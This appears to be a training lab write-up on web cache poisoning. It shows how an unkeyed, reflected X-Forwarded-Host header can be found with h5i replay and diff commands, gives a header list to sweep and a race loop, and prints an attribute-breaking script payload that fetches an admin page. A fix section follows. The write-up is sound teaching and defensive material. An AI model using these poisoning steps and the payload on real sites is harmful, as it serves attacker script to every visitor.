# Lab 33 — Newsroom

## The two halves

```python
site = req.header("X-Forwarded-Host", "…")            # 1. reflected into the page
return html(f'<link rel="canonical" href="http://{site}/">')

key = (req.header("Host", ""), req.path)              # 2. not part of the cache key
```

Either alone is minor. `X-Forwarded-Host` reflected but keyed is a self-XSS
nobody can deliver. Unkeyed but not reflected is nothing at all.

Together they are the definition of web cache poisoning:

> **An unkeyed input is one that changes the response and does not change where
> the response is filed.** One request from anybody replaces the page everybody
> else receives.

State the difference from reflected XSS plainly, because it is the reason this
finding is severe: a reflected payload needs the victim to follow *your link*. A
poisoned cache needs the victim to visit *the site*.

## Finding unkeyed inputs

The method is a diff, and h5i is built for it.

1. Request the page normally and note the response.
2. Request it again with one candidate header added.
3. Compare. If the response changed, the header is reflected.
4. Request it a third time *without* the header. If the change persists, the
   header was unkeyed and you have just poisoned the cache for everyone.

```bash
h5i websec replay req_0 --session lab33 --set path=/ --set header.X-Forwarded-Host=probe.example
h5i websec replay req_0 --session lab33 --set path=/
h5i websec diff res_1 res_2 --session lab33 --human
```

The headers worth sweeping, in rough order of hit rate:

```
X-Forwarded-Host   X-Host   X-Forwarded-Scheme   X-Forwarded-Proto
X-Original-URL     X-Rewrite-URL   X-Forwarded-Port   X-Forwarded-For
Origin             Referer         User-Agent         Accept-Language
X-Forwarded-Prefix Via             True-Client-IP     CF-Connecting-IP
```

Also unkeyed *query* parameters (an extra `?utm_source=` that is stripped from
the key but reflected in the page), the request method, and — the modern
favourite — **cache-key normalisation**: a parameter the cache lowercases or a
path the cache canonicalises differently from the origin.

Read the `X-Cache`, `Age`, `CF-Cache-Status` or `Via` header to tell a hit from
a miss; without that signal you are guessing.

## Winning the race

A hit never reaches the origin, and a payload that never reaches the origin is
never reflected — so poisoning is a race against the entry already in the cache.
You must arrive first after it expires.

```bash
for _ in $(seq 1 40); do
  h5i websec replay req_0 --session lab33 --reset-budget --repeat 5 \
      --set path=/ --set "header.X-Forwarded-Host=$PAYLOAD"
  …check the drop…
done
```

`--repeat 5` sends five together from inside the engine rather than paying
process startup between each, so the burst is genuinely a burst. `--reset-budget`
keeps a long loop from running out of page allowance halfway (Lab 06).

On a real target, look for a `PURGE`/`BAN` method, a cache-busting parameter
that shortens the wait, or simply a long enough loop.

## The payload

The reflection lands inside an attribute:

```
"><script>fetch('/admin/flag').then(…)</script><x y="
```

Close the attribute, close the tag, inject, and reopen an attribute so the rest
of the template still parses. As in Lab 21, the cookie is `HttpOnly`, so the
script *acts* as the editor rather than reading their cookie.

## The fix

* **Key on everything you vary on.** If a header changes the response, it
  belongs in the cache key — `Vary: X-Forwarded-Host`, or better, do not vary.
* Do not reflect `X-Forwarded-*` into responses at all. The application's own
  name is configuration (Lab 32).
* Strip incoming `X-Forwarded-*` at the edge and set them yourself.
* Do not cache responses that depend on a request header, and never cache a
  response produced for an authenticated request under an unauthenticated key.
* Escape on output, so that a cache bug is not also an XSS.

## h5i technique

`websec diff res_A res_B` as the primary instrument — it states the difference
(status, size, headers, changed JSON fields) instead of asking you to spot it —
plus `--repeat N` for a burst and `--reset-budget` for a long loop.
